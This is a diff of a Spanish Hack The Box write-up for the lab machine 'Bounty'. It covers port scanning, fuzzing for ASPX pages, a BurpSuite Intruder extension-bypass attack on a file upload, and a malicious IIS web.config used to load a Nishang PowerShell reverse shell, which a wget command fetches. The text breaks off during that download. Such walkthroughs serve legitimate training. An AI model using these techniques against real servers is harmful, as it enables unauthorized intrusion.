@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Bounty - Hack The Box
-excerpt: "Esta es una máquina algo sencilla, vamos a usar Fuzzing a la página web que está activa en puerto HTTP, como no descubrimos nada, buscaremos por archivos ASP, pues usa este servicio y encontraremos una subpágina para subir archivos. Utilizaremos BurpSuite para descubrir que archivos acepta, que en este caso serán los .config, usaremos un archivo web.config para cargar un Payload de Nishang .ps1, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos Juicy Potato, pues tiene este privilegio activo."
+excerpt: "Esta es una máquina algo sencilla, vamos a usar Fuzzing a la página web que está activa en el puerto HTTP, como no descubrimos nada, buscaremos por archivos ASP, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos BurpSuite para descubrir que archivos acepta, que en este caso serán los .config, usaremos un archivo web.config para cargar un Payload de Nishang .ps1, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos Juicy Potato, pues tiene los privilegios necesarios para utilizarlo."
 date: 2023-04-24
 classes: wide
 header:
@@ -17,14 +17,33 @@ tags:
   - Fuzzing
   - BurpSuite
   - Sniper Attack
-  - web.config Exploit
-  - ASP Payload
-  - Nishang
+  - Malicious web.config File
+  - ASP/ASPX Payload
   - Juicy Potato
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bounty/bounty_logo.png)
-Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web que está activa en puerto **HTTP**, como no descubrimos nada, buscaremos por archivos **ASP**, pues usa este servicio y encontraremos una subpágina para subir archivos. Utilizaremos **BurpSuite** para descubrir que archivos acepta, que en este caso serán los **.config**, usaremos un archivo **web.config** para cargar un Payload de **Nishang .ps1**, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos **Juicy Potato**, pues tiene este privilegio activo. 
+Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web que está activa en el puerto **HTTP**, como no descubrimos nada, buscaremos por archivos **ASP**, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos **BurpSuite** para descubrir que archivos acepta, que en este caso serán los **.config**, usaremos un archivo **web.config** para cargar un Payload de **Nishang .ps1**, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos **Juicy Potato**, pues tiene los privilegios necesarios para utilizarlo. 
+
+Herramientas utilizadas:
+* *nmap*
+* *wappalizer*
+* *whatweb*
+* *wfuzz*
+* *gobuster*
+* *burpsuite*
+* *burpsuite*
+* *python*
+* *nc*
+* *grep*
+* *wget*
+* *dir*
+* *whoami*
+* *systeminfo*
+* *locate*
+* *certutil.exe*
+* *juicy potato*
+
 
 <br>
 <hr>
@@ -39,16 +58,21 @@ Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web qu
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#P80">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
+				<li><a href="#Attack">Realizando un Ataque Sniper con BurpSuite</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Attack">Ataque Sniper con BurpSuite</a></li>
-				<li><a href="#Exploit">Buscando un Exploit</a></li>
+				<li><a href="#Exploit">Buscando un Exploit para el Servicio IIS</a></li>
+				<ul>
+					<li><a href="#Exploit2">Probando Archivo web.config Modificado</a></li>
+				</ul>
+				<li><a href="#Exploit3">Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
+				<li><a href="#Enum">Enumeración de Máquina Víctima</a></li>
 				<li><a href="#Juicy">Usando el Juicy Potato</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
@@ -70,7 +94,7 @@ Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web qu
 
 <h2 id="Ping">Traza ICMP</h2>
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
-```
+```bash
 ping -c 4 10.10.10.93
 PING 10.10.10.93 (10.10.10.93) 56(84) bytes of data.
 64 bytes from 10.10.10.93: icmp_seq=1 ttl=127 time=131 ms
@@ -85,7 +109,7 @@ rtt min/avg/max/mdev = 130.590/131.044/131.829/0.481 ms
 Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:51 CST
@@ -106,19 +130,22 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
            Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (956B)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Solo veo un puerto abierto, hagamos el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
-```
+```bash
 nmap -sC -sV -p80 10.10.10.93 -oN targeted                            
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:53 CST
 Nmap scan report for 10.10.10.93
@@ -135,12 +162,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Veo el servicio **IIS** que ya hemos hackeado en otras máquinas. Analicemos el puerto 80.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Veo el servicio **IIS** operando en el puerto HTTP que ya hemos hackeado en otras máquinas. Revisemos ese puerto.
 
 
 <br>
@@ -155,7 +185,7 @@ Veo el servicio **IIS** que ya hemos hackeado en otras máquinas. Analicemos el 
 <br>
 
 
-<h2 id="P80">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 Bien, entremos.
 
 ![](/assets/images/htb-writeup-bounty/Captura1.png)
@@ -166,142 +196,126 @@ Solamente hay una imagen, veamos que nos dice **Wappalizer**.
 <img src="/assets/images/htb-writeup-bounty/Captura2.png">
 </p>
 
-Ok, ya sabemos que nos enfrentamos al servicio **IIS**, hagamos **Fuzzing** para ver que nos podemos encontrar.
+Ok, ya sabemos que nos enfrentamos al servicio **IIS**, veamos si **whatweb** nos muestra algo distinto:
+```bash
+whatweb http://10.10.10.93
+http://10.10.10.93 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
+```
+
+Nada nuevo, cuando nos enfrentamos al **servicio IIS**, recordemos que utiliza **ASP.NET** lo cual indica que pueden existir archivos **ASP o ASPX** dentro de este servicio.
+
+Vamos a aplicar **Fuzzing** enfocado a que busque estos archivos.
 
 <h2 id="Fuzz">Fuzzing</h2>
-```
-wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ.php/
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
 
-Target: http://10.10.10.93/FUZZ.php/
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                               
-=====================================================================
-
-000000001:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt"                                     
-000000003:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher"                                       
-000000007:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
-000000013:   200        31 L     53 W       630 Ch      "#"                                                                   
-000000012:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts"                                      
-000000011:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found"    
-000000010:   200        31 L     53 W       630 Ch      "#"                                                                   
-000000009:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA."                 
-000000006:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"       
-000000008:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street,"          
-000000002:   200        31 L     53 W       630 Ch      "#"                                                                   
-000000005:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons"                  
-000000004:   200        31 L     53 W       630 Ch      "#"                                                                   
-
-Total time: 753.8032
-Processed Requests: 220560
-Filtered Requests: 220547
-Requests/sec.: 292.5962
-```
-* -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el código de estado 404, hc = hide code.
-* -t: Para usar una cantidad específica de hilos.
-* -w: Para usar un diccionario de wordlist.
-* Diccionario que usamos: dirbuster
-
-Mmmmmm no encontró nada, lo que podemos hacer es buscar archivos tipo **ASP** o **ASPX** porque, si recordamos, gracias al **Wappalizer** sabemos que la página web, usa **ASP.NET**.
-
-```
-wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z 
+```bash
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
 Target: http://10.10.10.93/FUZZ.FUZ2Z
-Total requests: 441120
+Total requests: 441092
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                               
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
 =====================================================================
 
-000000001:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt - asp"                               
-000000003:   200        31 L     53 W       630 Ch      "# - asp"                                                             
-000000007:   200        31 L     53 W       630 Ch      "# - asp"                                                             
-000000015:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street, - asp"    
-000000026:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
-000000025:   200        31 L     53 W       630 Ch      "# - asp"                                                             
-000000013:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - asp
-                                                        "                                                                     
-000000018:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA. - aspx"          
-000000023:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts - asp"                                
-000000011:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - asp" 
-000000010:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons - aspx"           
-000000016:   200        31 L     53 W       630 Ch      "# or send a letter to Creative Commons, 171 Second Street, - aspx"   
-000000012:   200        31 L     53 W       630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - aspx"
-000000014:   200        31 L     53 W       630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - asp
-                                                        x"                                                                    
-000000017:   200        31 L     53 W       630 Ch      "# Suite 300, San Francisco, California, 94105, USA. - asp"           
-000000021:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found - as
-                                                        p"                                                                    
-000000020:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
-000000022:   200        31 L     53 W       630 Ch      "# Priority ordered case sensative list, where entries were found - as
-                                                        px"                                                                   
-000000019:   200        31 L     53 W       630 Ch      "# - asp"                                                             
-000000024:   200        31 L     53 W       630 Ch      "# on atleast 2 different hosts - aspx"                               
-000000009:   200        31 L     53 W       630 Ch      "# This work is licensed under the Creative Commons - asp"            
-000000008:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
-000000002:   200        31 L     53 W       630 Ch      "# directory-list-2.3-medium.txt - aspx"                              
-000000004:   200        31 L     53 W       630 Ch      "# - aspx"                                                            
-000000006:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher - aspx"                                
-000000005:   200        31 L     53 W       630 Ch      "# Copyright 2007 James Fisher - asp"                                 
-000007566:   200        21 L     58 W       941 Ch      "transfer - aspx"                                                     
-000014008:   400        0 L      2 W        11 Ch       "*checkout* - aspx"                                                   
-000030926:   400        0 L      2 W        11 Ch       "*docroot* - aspx"                                                    
-000032826:   400        0 L      2 W        11 Ch       "* - aspx"                                                            
-000045942:   400        0 L      2 W        11 Ch       "http%3A%2F%2Fwww - aspx"
+000007538:   200        21 L     58 W       941 Ch      "transfer - aspx"                                                                                                                                                         
+000013980:   400        0 L      2 W        11 Ch       "*checkout* - aspx"                                                                                                                                                       
+000032798:   400        0 L      2 W        11 Ch       "* - aspx"                                                                                                                                                                
+000045914:   400        0 L      2 W        11 Ch       "http%3A%2F%2Fwww - aspx"                                                                                                                                                 
+000063706:   400        0 L      2 W        11 Ch       "http%3A - aspx"                                                                                                                                                          
+000070528:   400        0 L      2 W        11 Ch       "q%26a - aspx"                                                                                                                                                            
+000071290:   400        0 L      2 W        11 Ch       "**http%3a - aspx"                                                                                                                                                        
+000030898:   400        0 L      2 W        11 Ch       "*docroot* - aspx"                                                                                                                                                        
+000078386:   400        0 L      2 W        11 Ch       "*http%3A - aspx"
 ...
 ```
-* -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el código de estado 404, hc = hide code.
-* -t: Para usar una cantidad específica de hilos.
-* -w: Para usar un diccionario de wordlist.
-* Diccionario que usamos: dirbuster
-* -z: Especifica un payload para cada palabra clave del FUZZ usado en forma de nombre: parametro, encoder.
-* list,asp-aspx: Para listar los archivos tipo **ASP** y **ASPX**
 
-Encontramos uno, vamos a ver de que se trata:
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-z*	     | Para indicar el uso de una lista de extensiones de archivos a buscar. |
+
+<br>
+
+Ahora probemos con **gobuster**:
+```bash
+gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x asp,aspx
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.93/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              aspx,asp
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/transfer.aspx        (Status: 200) [Size: 941]
+/*checkout*.aspx      (Status: 400) [Size: 11]
+/*docroot*.aspx       (Status: 400) [Size: 11]
+/*.aspx               (Status: 400) [Size: 11]
+/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]
+/*http%3A.aspx        (Status: 400) [Size: 11]
+/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]
+/**http%3A.aspx       (Status: 400) [Size: 11]
+/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
+/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
+...
+Progress: 661576 / 661683 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |
+
+<br>
+
+Encontramos solamente un archivo llamado **transfer.aspx**, vamos a ver de que se trata:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura3.png">
 </p>
 
-Podemos subir un archivo, el problema es que no sabemos qué tipo de archivo acepta, así que tenemos dos opciones:
+Al parecer podemos subir un archivo, el problema es que no sabemos qué tipo de archivo acepta, así que tenemos dos opciones:
 * Probar con varios tipos para ver cuál acepta.
 * Usar **BurpSuite**
 
 Vamos a probar con **BurpSuite**.
 
+<h2 id="Attack">Realizando un Ataque Sniper con BurpSuite</h2>
 
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
+Lo que haremos será capturar la subida de archivos del **aspx**.
 
+Abre **BurpSuite** y ponlo en modo de captura, lo que haré será intentar subir una **Reverse Shell** de **PHP** que tenia a la mano para captura la petición.
 
-<h2 id="Attack">Ataque Sniper con BurpSuite</h2>
-Lo que haremos, será capturar la subida de archivos del **aspx**. Abre **BurpSuite** y ponlo en modo de captura, lo que haré será intentar subir una **Reverse Shell** de **PHP** para ver si lo acepta y aunque no lo haga, ya abre capturado la petición.
-
+-------------
 **IMPORTANTE**
 
-Este ataque es tardado, así que ten paciencia. Sigamos:
+Este ataque es tardado, así que ten paciencia.
 
-<p align="center">
+------------
+
+Sigamos:
+
+<p alignn="center">
 <img src="/assets/images/htb-writeup-bounty/Captura4.png">
 </p>
 
@@ -311,11 +325,11 @@ Y vemos lo que se capturó:
 <img src="/assets/images/htb-writeup-bounty/Captura5.png">
 </p>
 
-Debemos presionar **ctrl + i** para mandar la petición al **Intruder**. Nos vamos al **Intruder** y ya debería estar ahí:
+Mandamos nuestra captura al **Intruder**, puedes hacerlo rapido con **ctrl + i**. Ahora dirigete al **Intruder** y ya debería estar ahí:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura6.png">
-</p> 
+</p>
 
 Podemos escoger el tipo de ataque que queremos y ahí veremos el **ataque Sniper**:
 
@@ -323,13 +337,13 @@ Podemos escoger el tipo de ataque que queremos y ahí veremos el **ataque Sniper
 <img src="/assets/images/htb-writeup-bounty/Captura7.png">
 </p>
 
-Bien, lo que debemos hacer es limpiar la petición para poder cargar la extensión **.php** en el payload del ataque, para eso solamente le damos click al botón **clear** que está del lado derecho y debería quedar así:
+Bien, lo que debemos hacer es limpiar la captura para poder elegir donde vamos posicionar nuestro payload para el ataque, para eso solamente le damos click al botón **clear** que está del lado derecho y debería quedar así:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura8.png">
 </p>
 
-Seleccionamos la extensión **.php**:
+Del archivo que subimos, selecciona su extensión ya que es este el que vamos a usar para cargar nuestro payload, es decir, usaremos este archivo para que **BurpSuite** utilice un payload que escojamos e introduzca distintas extensiones para probar cual es la extensión que acepta la página:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura9.png">
@@ -347,7 +361,9 @@ Ahora vamos a cargar el Payload con las extensiones, para hacerlo, vamos a la se
 <img src="/assets/images/htb-writeup-bounty/Captura11.png">
 </p>
 
-De ahí, nos iremos al directorio **Seclists** que está en el directorio **/usr/share**:
+De ahí, nos iremos al directorio **Seclists** que está en el directorio **/usr/share**.
+
+**NOTA**: El directorio **Seclists** lo tienes que instalar en tu máquina, ya que de momento, no viene preinstalado en Kali.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura12.png">
@@ -365,25 +381,25 @@ Lo seleccionas, lo abres y ya estarán cargadas las extensiones:
 <img src="/assets/images/htb-writeup-bounty/Captura14.png">
 </p>
 
-**OJO**, debemos quitar la opción **Payload encoding** porque como estamos usando extensiones, si no la quitamos, nos va a url encodear los puntos y no servirá el ataque:
+**OJO**, debemos quitar la opción **Payload encoding** porque como estamos usando extensiones, si no la quitamos, nos va a url encodear los puntos de cada extensión y no servirá el ataque:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura17.png">
 </p>
 
-Vamos bien, ahora ve a la sección **Settings** y vamos a la sección **Grep - Extract** para añadir una expresión regular que nos va a mostrar lo que queremos ver:
+Vamos bien, ahora ve a la sección **Settings** y vamos a la sección **Grep - Extract** para añadir una expresión regular que nos va a mostrar lo que queremos ver, en este caso, que extensión acepta la página:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura15.png">
 </p>
 
-Sigue las indicaciones, dale a **Fecth Response** y selecciona el error **Invalid File. Please try again**:
+Sigue las indicaciones, dale a **Fecth Response** y selecciona el error **Invalid File. Please try again**, esto para que nos reporte resultados que no tengan esta clase de expresión:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura16.png">
 </p>
 
-Y ya está listo el ataque, si nos vamos hasta arriba podemos lanzar el ataque:
+Y ya está listo el ataque, si nos vamos hasta arriba de **BurpSuite** podemos lanzar el ataque con la opción **Start Attack**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura18.png">
@@ -395,13 +411,33 @@ Durante el ataque, veremos el siguiente archivo, este nos puede servir para busc
 <img src="/assets/images/htb-writeup-bounty/Captura19.png">
 </p>
 
-<h2 id="Exploit">Buscando un Exploit</h2>
-Mientras buscaba un Exploit usando este:
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Exploit">Buscando un Exploit para Servicio IIS</h2>
+
+Buscando por internet, encontre este blog que explica una vulnerabilidad en el **servicio IIS v7 (y superiores)** con el **archivo web.config**:
 * https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/
 
-Lo que hace este archivo es una simple operación matemática, sumando 2 + 1, el resultado debería mostrarse cuando se cargue este archivo en la página web.
+Este **archivo web.config** es similar a subir un **archivo .htacces** a un **servidor web Apache** que es de su configuración, existen tecnicas para subir **archivos .htaccess** maliciosos y poder realizar acciones como un Bypass a las protecciones que tenga el servidor, esto (menciona el blog) también lo podemos aplicar para el **servicio IIS v7 y superiores**, vamos a comprobarlo.
 
-Vamos a copiar ese archivo y lo llamaremos **web.config**, lo vamos a cargar a la página web para poder verla en la subpágina **uploadFiles**:
+Vamos a utilizar el primer ejemplo que viene en el blog, pues lo que hace este archivo es una simple operación matemática de 2+1, el resultado debería mostrarse cuando se cargue este archivo en la página web.
+
+<br>
+
+<h3 id="Exploit2">Probando Archivo web.config Modificado</h3>
+
+Copia ese ejemplo y lo llamaremos igual **web.config**, lo vamos a cargar a la página web para poder verla en alguno de los directorios **uploadFiles** que nos mostro **gobuster**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura20.png">
@@ -411,62 +447,26 @@ Vamos a copiar ese archivo y lo llamaremos **web.config**, lo vamos a cargar a l
 <img src="/assets/images/htb-writeup-bounty/Captura21.png">
 </p>
 
-Pero ¿Cómo sabemos en donde se guardó?, vamos a hacer un **Fuzzing**, pero usando un diccionario, qué este enfocado a subpáginas que sean para cargar archivos. Para esto, vamos a hacer un **grep** al **wordlist** que usamos, que en mi caso uso el **dirbuster/directory-list-2.3-medium.txt**:
-```
+Sabemos que ya se guardo con exito, antes de probar cualquier de los 3 directorios que encontro **gobuster**, vamos a comprobar si existen más directorios tipo **upload** con **wfuzz**.
+
+Vamos a hacer un **Fuzzing**, pero usando un diccionario qué este enfocado a directorios que sean para cargar archivos, es decir, los tipo **upload**. Para esto, vamos a hacer un **grep** al **wordlist** de **Dirbuster**, que siempre he usado, que sería el **dirbuster/directory-list-2.3-medium.txt**:
+```bash
 cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload
 uploads
 upload
 WPupload
 uploaded_images
 uploaded
-Upload
-Uploads
-gal_upload
-uploadedImages
-user_upload
-UploadedFiles
-uploadedimages
-upload_control
-uploadedFiles
-_upload
-upload_images
-torrents-upload
-videouploadform
-uploaded_files
-fileupload
-uploads2
-FileUploader
-NeatUpload
-uploadedfiles
-auto-uploaded
-megaupload
-uploading
-HTTP_Upload
-UploadFiles
-file-upload
-docUploads
-user_uploads
-home_upload
-viewuploads
-validator-upload
-lastupload
-uploadnets
-uploadweb
-file_upload
-upload_v2
-uploader
-primeupload
-uploaddir
-dss_upload
-UploadedImages
-uploadimages
+...
 ```
-Bien, salen estos resultados, vamos a guardarlos en un archivo **.txt** para usarlo como diccionario:
-```
+
+Bien, salen bastantes resultados. Vamos a guardarlos en un archivo **.txt** para usarlo como diccionario:
+```bash
 cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload > diccionario.txt
 ```
-Ahora vamos a usar **wfuzz** y usaremos el diccionario que creamos para que solamente busque las subpáginas como "upload":
-```
+
+Ahora vamos a usar **wfuzz** y usaremos el diccionario que creamos para que solamente busque los directorios tipo **upload**:
+```bash
 wfuzz -c --hc=404 -t 200 -w $(pwd)/diccionario.txt http://10.10.10.93/FUZZ/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -489,18 +489,26 @@ Processed Requests: 46
 Filtered Requests: 43
 Requests/sec.: 76.62198
 ```
-Muy bien, nos sacó 3 resultados con código de estado de 403, ósea que existen, pero no tenemos acceso a ellos. Ya sabemos donde se guardó nuestro archivo **web.config**. Aunque no tengamos permiso para ver estas subpáginas, si conocemos el nombre del archivo, podemos acceder sin ningún problema.
+Muy bien, ya comprobamos que no encontro más directorios de este tipo aunque me reporta un código de estado distinto a **gobuster**, siendo el código de estado de 403, ósea que existen estos directorios, pero no tenemos acceso a ellos. 
 
-Nos vamos a la subpágina **uploadFiles**, ponemos el nombre **web.config** y deberíamos ver un 3, si no se ve, vuelve a subir el archivo y carga la página otra vez:
+Nosotros ya sabemos que se guardó nuestro archivo **web.config**, aunque no tengamos permiso para ver/entrar estos directorios, si conocemos el nombre del archivo que buscamos, podremos verlo sin ningún problema.
+
+Ve al directorio **uploadFiles**, pon el nombre **web.config** y deberíamos ver un 3, si no se ve, vuelve a subir el archivo y carga la página otra vez:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bounty/Captura22.png">
 </p>
 
-Excelente, entonces podemos aprovecharnos de esto para poder acceder a la máquina. Para esto, vamos a cambiar el script del **web.config** para que pueda cargar un Payload y nos pueda conectar a la máquina. El Payload que vamos a ocupar será de **Nishang**, usaremos el **Invoke-PowerShellTcp.ps1**.
+Excelente, entonces podemos aprovecharnos de esto para poder ganar acceso a la máquina. 
 
-Copiamos el archivo en nuestra máquina:
-```
+<h2 id="Exploit3">Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina</h2>
+
+Para realizar esto, vamos a cambiar el script del **web.config** para que pueda cargar un **Payload** de una **Reverse Shell** y nos pueda conectar a la máquina. El **Payload** que vamos a ocupar será de **Nishang**, usaremos el **Invoke-PowerShellTcp.ps1**.
+
+Vamos por pasos:
+
+* Copiamos el archivo en nuestra máquina:
+```bash
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 --2023-04-24 21:13:28--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
@@ -508,57 +516,60 @@ Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108
 Petición HTTP enviada, esperando respuesta... 200 OK
